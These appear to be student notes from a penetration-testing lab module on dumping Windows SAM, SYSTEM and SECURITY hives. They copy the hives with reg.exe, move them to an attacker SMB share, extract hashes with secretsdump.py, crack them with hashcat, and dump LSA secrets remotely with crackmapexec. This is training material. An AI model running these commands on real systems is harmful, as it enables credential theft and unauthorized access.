
SAM aka Security account manager is a database file that stores hashed user account passwords for the local system
it is located at
C:\Windows\System32\config\SAM

With admin rights on a machine you can retrieve the hash passwords. You can easily dump this through a metrepreter shell

the hashes inside SAM are usually stored in NTLM hash format


## Copying SAM registry 

there are three registry hives we can copy if we have local admin access on the target; each will have a specific purpose where we can get to dumping and cracking the hashes. Here is a brief description


|                 |                                                                                                                                                            |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `hklm\sam`      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| `hklm\system`   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |
| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |


We can create backups of these hives using the reg.exe utility


## Using reg.exe save to copy registry hives

Launching CMD as admin will allow us to run reg.exe to save copies of the aforementioned registry hives. Run these commands below to do so.

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```


Technically we will only need `hklm\sam` & `hklm\system`, but `hklm\security` can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts. Once the hives are saved offline, we can use various methods to transfer them to our attack host. In this case, let's use [Impacket's smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) in combination with some useful CMD commands to move the hive copies to a share created on our attack host.


## Creating a share with smbserver.py
*Remember SMB or a server message block is a network protocol used for sharing files, folders printers and more anything with \\ip\share is a smb block*

All we must do to  create the share is run smbserver.py -smb2support .
using python and give the share a name (CompData) and specify the directory on our attack host where the share will be storing the hive copies (/home/ltnbob/Documents). Know that the smb2support option will ensure new version of SMB are supported if we dont use this flag their will be errors as new versions of windows dont support SMBv1.



```shell-session
JackTheWizard@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Once we have the share running on our attack host, we can use the `move` command on the Windows target to move the hive copies to the share.

#### Moving Hive Copies to Share

Attacking SAM

```cmd-session
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

Then we can confirm that our hive copies successfully moved to the share by navigating to the shared directory on our attack host and using `ls` to list the files.


## Dumping hashes using ImPackets secretsdump.py

One incredibly useful tool we can use to dump the hashes offline is Impacket's `secretsdump.py`. Impacket can be found on most modern penetration testing distributions. We can check for it by using `locate` on a Linux-based system:


Using secretsdump.py is a simple process. All we must do is run secretsdump.py using Python, then specify each hive file we retrieved from the target host.

#### Running secretsdump.py

Attacking SAM

```shell-session
JackTheWizard@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```


Here we see that secretsdump successfully dumps the `local` SAM hashes and would've also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security. Notice the first step secretsdump executes is targeting the `system bootkey` before proceeding to dump the `LOCAL SAM hashes`. It cannot dump those hashes without the boot key because that boot key is used to encrypt & decrypt the SAM database, which is why it is important for us to have copies of the registry hives we discussed earlier in this section. Notice at the top of the secretsdump.py output:

Attacking SAM

```shell-session
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

This tells us how to read the output and what hashes we can crack. Most modern Windows operating systems store the password as an NT hash. Operating systems older than Windows Vista & Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS.

Knowing this, we can copy the NT hashes associated with each user account into a text file and start cracking passwords. It may be beneficial to make a note of each user, so we know which password is associated with which user account.

so for example

```shell-session
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
```



so since most windows computers use the NT hash 6f8c3f4d3869a10f3b4f0522f537fd33 is the hash we use. Its not like we need to use both but they display it in both formats as some older windows systems use LM hashes

✅ **Modern Windows only really uses the NT hash** — that `6f8c3f4d3869a10f3b4f0522f537fd33` part. 

Here we see that secretsdump successfully dumps the `local` SAM hashes and would've also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security. Notice the first step secretsdump executes is targeting the `system bootkey` before proceeding to dump the `LOCAL SAM hashes`. It cannot dump those hashes without the boot key because that boot key is used to encrypt & decrypt the SAM database, which is why it is important for us to have copies of the registry hives we discussed earlier in this section. Notice at the top of the secretsdump.py output:



#### Running Hashcat against NT Hashes

Hashcat has many different modes we can use. Selecting a mode is largely dependent on the type of attack and hash type we want to crack. Covering each mode is beyond the scope of this module. We will focus on using `-m` to select the hash type `1000` to crack our NT hashes (also referred to as NTLM-based hashes). We can refer to Hashcat's [wiki page](https://hashcat.net/wiki/doku.php?id=example_hashes) or the man page to see the supported hash types and their associated number. We will use the infamous rockyou.txt wordlist mentioned in the `Credential Storage` section of this module.




## Remote Dumping & LSA Secrets Considerations

With access to credentials with `local admin privileges`, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.

#### Dumping LSA Secrets Remotely
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Secrets
**LSA** (Local Security Authority)
**LSA Secrets** = "Here are **passwords and tokens** Windows saved for services, VPNs, cached logins, and other stuff."

```shell-session
JackTheWizard@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```


#### Dumping SAM Remotely
**SAM** = "Here are the **password hashes** for all user accounts."
We can also dump hashes from the SAM database remotely.

Attacking SAM

```shell-session
JackTheWizard@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

*we use netexec which is the newer version of crackmapexec*
